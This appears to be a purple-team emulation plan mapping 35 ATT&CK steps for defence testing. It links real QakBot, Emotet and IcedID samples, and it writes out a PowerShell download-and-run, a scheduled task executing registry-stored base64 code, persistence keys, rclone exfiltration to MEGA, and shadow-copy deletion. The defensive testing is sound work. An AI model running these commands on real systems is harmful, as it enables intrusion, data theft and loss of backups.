

Use the spreadsheet to lead the purple team exercise. 
By default the spreadsheet offers 2 lines to document security controls. If you have identified (pre or post execution) more than 2 security controls, just add a new line and document as usual (I mean Excel stuff...).

I tried as much as possible to avoid using C2
So you might enrich this emulation plan with a bit more C2 flavors to make it more realistic.
However this is a very good start for any organization to test their defenses against typical TTPs. And it doesn't require a strong mature red team infra.

Here is the list of steps in a more readable format with added comments.


### Step 1 - Reconnaissance: n/a

Not covered

### Step 2 - Resource Development: T1608.006 Stage Capabilities: SEO Poisoning

Not covered but most software recently SEO-poisoned could be found here:
https://github.com/Sam0x90/CTI/blob/main/ATT%26CK/Techniques/T1608_Stage_Capabilities/T1608.006_SEO_Poisoning/SEO_poisoned_software.txt

### Step 3 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0650 QakBot

1. Download sample file here: https://bazaar.abuse.ch/sample/27bb0a8c1d9f9e7eaee26a97bd01f377c1f3048b881107021f60f7804410ebe8/
2. Prepare email with attachment and a controlled mailbox for simulation (to avoid infection)
3. Send email

### Step 4 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0367 Emotet

1. Download sample file here: https://bazaar.abuse.ch/sample/9f8b5f5da718fafb98de9b2128cd81fd720a37de6c755b81965ead358aeb912a/
2. Prepare email with attachment and a controlled mailbox for simulation (to avoid infection)
3. Send email

### Step 5 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0483 IcedID

1. Download sample file here: https://bazaar.abuse.ch/sample/26ea40677a90116aeb5a0d8aba85ce66edd4669573decafac12f5ed089668216/
2. Prepare email with attachment and a controlled mailbox for simulation (to avoid infection)
3. Send email

### Step 6 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0367 Emotet

1. Download sample file here: https://bazaar.abuse.ch/sample/9ba1b1bf9bccdf3cdd0e07616da28acea278e70f77dce249bc821c552a846aa8/
2. Prepare email with attachment and a controlled mailbox for simulation (to avoid infection)
3. Send email

### Step 7 - Initial Access: T1566.002 Phishing: Spearphishing Link

1. Pick a phishing URL from PhishTank or ThreatFox database
2. Prepare email with link and a controlled mailbox as recipient for simulation (to avoid leaking information)
3. Send email

### Step 8 - Execution: T1204.002 User Exectution: Malicious File

1. Create PE file with extension .exe in C:\Users\Public
2. Create DLL file with extension .dll in C:\Users\Public
3. Create PE file with extension .dat in C:\Users\Public

### Step 9 - Execution: T1059.001 Powershell

1. Download test LNK here: https://github.com/Sam0x90/CTI/blob/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/atomic.lnk
2. Double click the lnk

This LNK will run the following powershell command line:

```powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB1AHIAbAA9ACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBTAGEAbQAwAHgAOQAwAC8AQwBUAEkALwByAGEAdwAvAG0AYQBpAG4ALwBBAGQAdgBlAHIAcwBhAHIAeQAlADIAMABFAG0AdQBsAGEAdABpAG8AbgAlADIAMABQAGwAYQBuAHMALwAyADAAMgAyAF8AVABvAHAAMwA1AF8ATQBpAHQAcgBlAC8AYwBhAGwAYwAuAGUAeABlACIAOwAkAHAAYQB0AGgAPQAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAYwBhAGwAYwAuAGUAeABlACIAOwBpAHcAcgAgAC0AdQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABwAGEAdABoADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAGEAdABoAA==```

This is the decoded command, which will download a legit Windows calc.exe from this repository before running it: 

```$url="https://github.com/Sam0x90/CTI/raw/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/calc.exe";$path="C:\Users\Public\calc.exe";iwr -uri $url -OutFile $path;Start-Process -FilePath $path```

### Step 10 - Execution/Discovery: T1059.001 Powershell & T1135 Network Share Discovery

Using Powerview, here is procedure example:

```Invoke-ShareFinder -CheckShareAccess - Verbose | Out-File -Encoding ascii C:\ProgramData\shares.txt```

### Step 11 - Execution/Discovery: T1059.001 Powershell

"Using Powerview recon script to execute several discovery commands such as:

```Get-NetLocalGroup```
```Get-NetLocalGroupMember```
```Get-NetShare```
```Get-NetDomain```
```Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}```
```Get-DomainSID```
```Get-DomainTrust```
```Get-DomainGPO```
```Get-DomainPolicy```"

### Step 12 - Execution/Discovery: T1047 Windows Management Instrumentation & T1518 Software Discovery

```wmic product get name,version```

### Step 13 - Execution/Discovery: T1047 Windows Management Instrumentation & T1082 System Information Discovery

```wmic computersystem get domain```

### Step 14 - Execution/Persistence: T1047 Windows Management Instrumentation & T1546.003 Event Triggered Execution: WMI Event Subscription

1. Copy the script "cmd_fileping.vbs" in C:\temp\ folder
2. Copy and run as admin the script wmi_event_sub.ps1
3. Open a notepad.exe
4. Copy and run as admin the script wmi_sub_remove.ps1 to clean up the WMI subscription.

### Step 15 - Execution/Lateral Movement: T1047 Windows Management Instrumentation & T1021.006 Remote Services: Windows Remote Management

```wmic /node:IP process call create "cmd.exe /c start C:\windows\system32\calc.exe"```

### Step 16 - Persistence: T1053.005 Scheduled Task

```schtasks.exe /Create /F /TN "{GUID}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\thekey).xyz))) " /SC MINUTE /MO 30```

### Step 17 - Persistence: T1547.001 Registry Run Keys / Stratup Folder

```reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```
```reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```
```reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```
```reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```
```reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Startup" /t REG_EXPAND_SZ /d "C:\temp" /f```
```reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Run" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```

### Step 18 - Privilege Escalation/Defense Evasion: T1055.001 Process Injection: Dynamic-link Library Injection & S0154 Cobalt Strike



### Step 19 - Privilege Escalation/Defense Evasion: T1055.012 Process Injection: Process Hollowing



### Step 20 - Defense Evasion: T1218.010 System Binary Proxy Execution: Regsvr32



### Step 21 - Defense Evasion: T1218.011 System Binary Proxy Execution: Rundll32



### Step 22 - Credential Access: T1003.001 OS Credential Dumping: LSASS Memory & S0002 Mimikatz & S0349 Lazagne



### Step 23 - Credential Access: T1003.003 OS Credential Dumping: NTDS



### Step 24 - Credential Access: T1110.003 Brute force: Password Spraying



### Step 25 - Discovery: T1482 Domain Trust Discovery & T1018 Remote System Discovery & T1016 System Network Configuration Discovery & T1082 System Information Discovery

Run the following discovery commands:
```
ipconfig /all
net view /all
systeminfo
ping -n 1 <IP>
nltest /dclist:
nltest /domain_trusts
nltest /domain_trust /all_trusts
net group "Domain Administrators" /domain
route print
nslookup -querytype=ALL -timeout=10
cmd /c set
netstat -nao
net localgroup
```

### Step 26 - Discovery: T1087.002 Account Discovery: Domain Account & T1018 Remote System Discovery & S0552 AdFind

adfind.exe
renamed_adfind.exe
adfind -f (objectcategory=person) > ad_users.txt
adfind -f objectcategory=computer > ad_computers.txt

### Step 27 - Lateral Movement: T1021.001 Remote Services: Remote Desktop Protocol



### Step 28 - Lateral Movement: T1021.002 Remote Services: SMB/Windows Admin Shares



### Step 29 - Lateral Movement: T1550.002 Use Alternate Authentication Material: Pass the Hash



### Step 30 - Collection: T1560.001 Archive Collected Data: Archive via Utility & S0160 certutil



### Step 31 - Command and Control: T1219 Remote Access Software

AnyDesk
Splashtop Remote/Streamer
Atera RMM
TeamViewer

### Step 32 - Command and Control: T1071 Application Layer Protocol

TBD, tools and malware families to simulate have to be selected
https://github.com/alphasoc/flightsim

### Step 33 - Exfiltration: T1567 Exfiltration Over Web Service: Exfiltration to Cloud Storage & S1040 Rclone

```rclone.exe copy ''\\server\path" mega:folder -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6```

### Step 34 - Impact: T1490 Inhibit System Recovery

```vssadmin delete shadows /all /quiet```

### Step 35 - Impact: T1490 Inhibit System Recovery

```wmic shadowcopy delete```


# TO-DO:
- Scoring and/or reporting to evaluate/benchmark. 






